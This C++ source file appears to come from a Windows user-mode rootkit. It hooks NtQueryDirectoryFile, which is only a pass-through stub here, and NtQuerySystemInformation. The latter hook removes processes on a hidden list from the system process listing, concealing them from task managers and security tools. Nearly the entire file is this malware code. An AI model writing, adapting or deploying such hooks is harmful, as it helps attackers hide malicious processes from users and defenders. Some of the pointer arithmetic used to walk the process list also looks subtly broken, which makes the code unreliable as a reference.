/* NT Hooks */
#include "riftrk.h"

namespace hk {
	nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
	NTSTATUS NTAPI NtQueryDirectoryFileHook(
		_In_                       HANDLE          FileHandle,
		_In_opt_                   HANDLE          Event,
		_In_opt_                   PVOID           ApcRoutine,
		_In_opt_                   PVOID           ApcContext,
		_Out_                      PVOID           IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID           FileInformation,
		_In_                       ULONG           Length,
		_In_                       ULONG           FileInformationClass,
		_In_                       BOOLEAN         ReturnSingleEntry,
		_In_opt_               nt::PUNICODE_STRING FileName,
		_In_                       BOOLEAN         RestartScan
	) {
		NTSTATUS s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
			ApcContext, IoStatusBlock, FileInformation, Length,
			FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

		return s;
	}

	nt::NtQuerySystemInformation_t NtQuerySystemInformation;
	NTSTATUS NTAPI NtQuerySystemInformationHook(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
	) {
		NTSTATUS s = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

		if (SystemInformationClass == 0x05) {
			if (!ProcessList.GetItemCount())
				return s; // No Items to Hide

			nt::SYSTEM_PROCESS_INFORMATION* CurrentEntry = (nt::SYSTEM_PROCESS_INFORMATION*)SystemInformation;
			do {
				if (!CurrentEntry->NextEntryOffset)
					break;
				nt::SYSTEM_PROCESS_INFORMATION* NextEntry = (ptr)CurrentEntry->NextEntryOffset + CurrentEntry;

				// Compare Process against hidden list
				ProcessList.LockVector();
			RedoNext:
				uint32* PId = (uint32*)ProcessList.GetFirstEntry();
				do {
					// Unlink Entry if match
					if ((uint32)NextEntry->UniqueProcessId == *PId) {
						if (NextEntry->NextEntryOffset)
							CurrentEntry->NextEntryOffset += NextEntry->NextEntryOffset;
						else
							CurrentEntry->NextEntryOffset = 0;

						// redo for next element
						NextEntry = (ptr)CurrentEntry->NextEntryOffset + CurrentEntry;
						goto RedoNext;
					}
				} while (PId = (uint32*)ProcessList.GetNextEntry(PId));
				ProcessList.UnlockVector();

				CurrentEntry = (ptr)CurrentEntry->NextEntryOffset + CurrentEntry;
			} while (CurrentEntry->NextEntryOffset);
		}

		return s;
	}
}